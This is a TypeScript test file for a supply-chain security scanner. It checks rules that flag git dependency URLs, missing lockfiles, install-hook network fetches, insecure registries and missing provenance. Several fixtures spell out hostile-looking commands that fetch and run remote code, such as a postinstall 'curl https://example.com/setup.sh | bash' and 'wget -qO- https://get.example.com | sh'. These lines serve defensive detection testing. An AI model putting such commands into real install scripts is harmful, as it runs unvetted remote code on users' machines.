// @vitest-environment node
import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { mkdtempSync, rmSync, writeFileSync, mkdirSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { SUPPLY_CHAIN_RULES } from './supply-chain';
import { CONFIG_DEFAULTS } from '../config';
import type { ScanResult } from '../types';

const EMPTY_SCAN: ScanResult = {
  _generatedSections: [],
  generatedAt: '2024-01-01T00:00:00.000Z',
  scanVersion: '2.0.0',
  pages: [],
  apiRoutes: [],
  componentCount: 0,
  sharedUiFiles: [],
  designSystemFiles: [],
  storeFiles: [],
  testFiles: [],
  largeFiles: [],
  riskyFiles: [],
  scriptFiles: [],
  envFiles: [],
  clientBoundaryRisks: [],
};

function detect(ruleId: string, files: Array<{ path: string; content: string }>, root?: string) {
  const r = SUPPLY_CHAIN_RULES.find((r) => r.id === ruleId);
  if (!r) throw new Error(`Rule ${ruleId} not found`);
  return r.detect({ scan: EMPTY_SCAN, config: CONFIG_DEFAULTS, changedFiles: files, root });
}

// ── SC_001 — git dependency URL ───────────────────────────────────────────────

describe('SC_001 — git dependency URL', () => {
  it('fires on github: dependency URL', () => {
    const findings = detect('SC_001', [{
      path: 'package.json',
      content: JSON.stringify({
        name: 'my-app',
        dependencies: { 'some-pkg': 'github:user/repo' },
      }, null, 2),
    }]);
    expect(findings.length).toBeGreaterThan(0);
    expect(findings[0]?.severity).toBe('HIGH');
  });

  it('fires on git+https: URL in devDependencies', () => {
    const findings = detect('SC_001', [{
      path: 'package.json',
      content: JSON.stringify({
        name: 'my-app',
        devDependencies: { 'some-pkg': 'git+https://github.com/user/repo' },
      }, null, 2),
    }]);
    expect(findings.length).toBeGreaterThan(0);
  });

  it('does NOT fire on normal semver versions', () => {
    const findings = detect('SC_001', [{
      path: 'package.json',
      content: JSON.stringify({
        name: 'my-app',
        dependencies: { react: '^18.0.0', typescript: '5.0.0' },
      }, null, 2),
    }]);
    expect(findings).toHaveLength(0);
  });

  it('does NOT fire on non-package.json files', () => {
    const findings = detect('SC_001', [{
      path: 'src/config.ts',
      content: `const url = "github:user/repo";`,
    }]);
    expect(findings).toHaveLength(0);
  });
});

// ── SC_002 — missing lockfile ─────────────────────────────────────────────────

describe('SC_002 — missing lockfile', () => {
  let emptyRoot: string;
  beforeEach(() => { emptyRoot = mkdtempSync(join(tmpdir(), 'thesmos-sc002-')); });
  afterEach(() => { rmSync(emptyRoot, { recursive: true, force: true }); });

  it('fires when package.json present but no lockfile in changed files or on disk', () => {
    const findings = detect('SC_002', [{
      path: 'package.json',
      content: JSON.stringify({ name: 'my-app', dependencies: { react: '^18.0.0' } }, null, 2),
    }], emptyRoot);
    expect(findings.length).toBeGreaterThan(0);
    expect(findings[0]?.severity).toBe('BLOCKER');
  });

  it('does NOT fire when a workspace-root lockfile exists on disk (monorepo member package.json edit)', () => {
    writeFileSync(join(emptyRoot, 'package-lock.json'), '{}');
    mkdirSync(join(emptyRoot, 'packages', 'app'), { recursive: true });
    const findings = detect('SC_002', [{
      path: 'packages/app/package.json',
      content: JSON.stringify({ name: 'app', dependencies: { react: '^18.0.0' } }, null, 2),
    }], emptyRoot);
    expect(findings).toHaveLength(0);
  });

  it('does NOT fire when a lockfile sits next to the edited package.json', () => {
    mkdirSync(join(emptyRoot, 'pkg'), { recursive: true });
    writeFileSync(join(emptyRoot, 'pkg', 'yarn.lock'), '');
    const findings = detect('SC_002', [{
      path: 'pkg/package.json',
      content: JSON.stringify({ name: 'pkg' }, null, 2),
    }], emptyRoot);
    expect(findings).toHaveLength(0);
  });

  it('does NOT fire when package-lock.json is present', () => {
    const findings = detect('SC_002', [
      { path: 'package.json', content: JSON.stringify({ name: 'my-app' }, null, 2) },
      { path: 'package-lock.json', content: '{}' },
    ]);
    expect(findings).toHaveLength(0);
  });

  it('does NOT fire when yarn.lock is present', () => {
    const findings = detect('SC_002', [
      { path: 'package.json', content: JSON.stringify({ name: 'my-app' }, null, 2) },
      { path: 'yarn.lock', content: '# yarn lockfile' },
    ]);
    expect(findings).toHaveLength(0);
  });
});

// ── SC_003 — postinstall network fetch ───────────────────────────────────────

describe('SC_003 — postinstall network fetch', () => {
  it('fires on curl in postinstall script', () => {
    const findings = detect('SC_003', [{
      path: 'package.json',
      content: JSON.stringify({
        name: 'my-app',
        scripts: { postinstall: 'curl https://example.com/setup.sh | bash' },
      }, null, 2),
    }]);
    expect(findings.length).toBeGreaterThan(0);
    expect(findings[0]?.severity).toBe('BLOCKER');
  });

  it('fires on wget in preinstall script', () => {
    const findings = detect('SC_003', [{
      path: 'package.json',
      content: JSON.stringify({
        name: 'my-app',
        scripts: { preinstall: 'wget https://example.com/setup.sh' },
      }, null, 2),
    }]);
    expect(findings.length).toBeGreaterThan(0);
  });

  it('does NOT fire on local scripts', () => {
    const findings = detect('SC_003', [{
      path: 'package.json',
      content: JSON.stringify({
        name: 'my-app',
        scripts: { postinstall: 'node scripts/setup.js' },
      }, null, 2),
    }]);
    expect(findings).toHaveLength(0);
  });
});

// ── SC_004 — npm registry using http ─────────────────────────────────────────

describe('SC_004 — npmrc http registry', () => {
  it('fires on http:// registry in .npmrc', () => {
    const findings = detect('SC_004', [{
      path: '.npmrc',
      content: 'registry=http://registry.npmjs.org\nalways-auth=true',
    }]);
    expect(findings.length).toBeGreaterThan(0);
    expect(findings[0]?.severity).toBe('HIGH');
  });

  it('does NOT fire on https:// registry', () => {
    const findings = detect('SC_004', [{
      path: '.npmrc',
      content: 'registry=https://registry.npmjs.org',
    }]);
    expect(findings).toHaveLength(0);
  });
});

// ── SC_005 — no engines field ─────────────────────────────────────────────────

describe('SC_005 — missing engines field', () => {
  it('fires when engines field is absent', () => {
    const findings = detect('SC_005', [{
      path: 'package.json',
      content: JSON.stringify({ name: 'my-app', version: '1.0.0', dependencies: {} }, null, 2),
    }]);
    expect(findings.length).toBeGreaterThan(0);
    expect(findings[0]?.severity).toBe('MEDIUM');
  });

  it('does NOT fire when engines is present', () => {
    const findings = detect('SC_005', [{
      path: 'package.json',
      content: JSON.stringify({ name: 'my-app', engines: { node: '>=20' } }, null, 2),
    }]);
    expect(findings).toHaveLength(0);
  });
});

// ── SC_006 — npm publish without provenance ───────────────────────────────────

describe('SC_006 — npm publish without provenance', () => {
  it('fires on npm publish without --provenance in CI workflow', () => {
    const findings = detect('SC_006', [{
      path: '.github/workflows/publish.yml',
      content: 'steps:\n  - run: npm publish --access public\n',
    }]);
    expect(findings.length).toBeGreaterThan(0);
    expect(findings[0]?.severity).toBe('HIGH');
  });

  it('does NOT fire when --provenance is included', () => {
    const findings = detect('SC_006', [{
      path: '.github/workflows/publish.yml',
      content: 'steps:\n  - run: npm publish --provenance --access public\n',
    }]);
    expect(findings).toHaveLength(0);
  });
});

// ── SC_007 — curl | bash ──────────────────────────────────────────────────────

describe('SC_007 — curl pipe bash', () => {
  it('fires on curl | bash in shell script', () => {
    const findings = detect('SC_007', [{
      path: 'scripts/install.sh',
      content: 'curl -fsSL https://example.com/setup.sh | bash\n',
    }]);
    expect(findings.length).toBeGreaterThan(0);
    expect(findings[0]?.severity).toBe('MEDIUM');
  });

  it('fires on wget | sh in CI workflow', () => {
    const findings = detect('SC_007', [{
      path: '.github/workflows/setup.yml',
      content: '- run: wget -qO- https://get.example.com | sh\n',
    }]);
    expect(findings.length).toBeGreaterThan(0);
  });

  it('does NOT fire on plain curl without pipe', () => {
    const findings = detect('SC_007', [{
      path: 'scripts/download.sh',
      content: 'curl -fsSL https://example.com/file.tar.gz -o file.tar.gz\n',
    }]);
    expect(findings).toHaveLength(0);
  });
});

// ── SC_008 — no files field in public package ─────────────────────────────────

describe('SC_008 — no files field', () => {
  it('fires on public package without files field', () => {
    const findings = detect('SC_008', [{
      path: 'package.json',
      content: JSON.stringify({ name: 'my-lib', version: '1.0.0' }, null, 2),
    }]);
    expect(findings.length).toBeGreaterThan(0);
    expect(findings[0]?.severity).toBe('HIGH');
  });

  it('does NOT fire when files field is present', () => {
    const findings = detect('SC_008', [{
      path: 'package.json',
      content: JSON.stringify({ name: 'my-lib', version: '1.0.0', files: ['dist/'] }, null, 2),
    }]);
    expect(findings).toHaveLength(0);
  });

  it('does NOT fire on private packages', () => {
    const findings = detect('SC_008', [{
      path: 'package.json',
      content: JSON.stringify({ name: 'my-app', version: '1.0.0', private: true }, null, 2),
    }]);
    expect(findings).toHaveLength(0);
  });
});

// ── SC_010 — git:// protocol ──────────────────────────────────────────────────

describe('SC_010 — git protocol dependency', () => {
  it('fires on git:// URL in package.json', () => {
    const findings = detect('SC_010', [{
      path: 'package.json',
      content: '{\n  "dependencies": {\n    "some-pkg": "git://github.com/user/repo"\n  }\n}',
    }]);
    expect(findings.length).toBeGreaterThan(0);
    expect(findings[0]?.severity).toBe('HIGH');
  });

  it('does NOT fire on git+https:// URL', () => {
    const findings = detect('SC_010', [{
      path: 'package.json',
      content: '{\n  "dependencies": {\n    "some-pkg": "git+https://github.com/user/repo"\n  }\n}',
    }]);
    expect(findings).toHaveLength(0);
  });
});
